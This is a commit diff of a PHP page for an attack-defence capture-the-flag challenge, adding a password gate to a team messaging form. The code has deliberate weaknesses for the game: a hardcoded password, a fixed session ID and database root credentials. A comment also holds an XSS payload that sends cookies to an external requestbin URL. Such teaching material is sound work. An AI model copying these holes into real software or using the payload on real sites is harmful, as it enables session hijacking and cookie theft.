46450be3c2fbe2416fd6e1ed83e9a48ce54c7067
MSIR2018 <36412637+MSIR2018@users.noreply.github.com>
2018-02-27 16:14:22 +0100

    Update index.php

--- Docker/Challenges/http-023/TeamA/data/index.php
+++ Docker/Challenges/http-023/TeamA/data/index.php
@@ -1,12 +1,30 @@
+<html>
+<head>
+	<!-- Latest compiled and minified CSS -->
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+	<!-- Optional theme -->
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
+
+</head>
+<body>
+<div class="container">
 <?php
-if(strstr($_SERVER['HTTP_HOST'], '11.0')){
-	session_id ('ahahbi3njoueJ3su6slefl4g');
+if (isset($_POST['access']))
+{	
+	if($_POST['pass']=='Bi3nvenueT3amA'){
+		echo 'ok';
+		session_id ('ahahbi3njoueJ3su6slefl4g');
+		session_start();
+		$_SESSION['team']='A';
+	}
 }
+
 
 //"<script>document.write(\'<img src=\"http://requestbin.fullcontact.com/1ap2jla1?cookie==\'+document.cookie+\'\">aaaa</img>\');</script>"
 
 session_start();
-
+if(isset($_SESSION['team']) and ($_SESSION['team']=='A')){
 try {
 		$bdd = new PDO ('mysql:host=localhost;dbname=ctf','root','Azerty@123');
 	}
@@ -26,17 +44,6 @@ if (isset($_POST['valider']))
 }
 ?>
 
-<html>
-<head>
-	<!-- Latest compiled and minified CSS -->
-	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
-
-	<!-- Optional theme -->
-	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
-
-</head>
-<body>
-<div class="container">
 <div class="panel panel-default">
   <div class="panel-heading text-center">Attaquez l'équipe adverse et récuperez son flag ... mais attention n'oubliez pas de defendre le votre !</div>
   <div class="panel-body">
@@ -60,6 +67,13 @@ if (isset($_POST['valider']))
 	</form>
   </div>
 </div>
+<?php }else{ ?>
+	<form method="post" action="index.php">
+			<p>Entrez le mot de passe pour acceder à la messagerie de groupe</p>
+			<input type="text" name="pass" class="form-control col-xs-2"> 
+			<input type="submit" value="Valider" name="access" class="form-control col-xs-2">
+	</form>
+<?php } ?>
 </div>
 </body>
 </html>
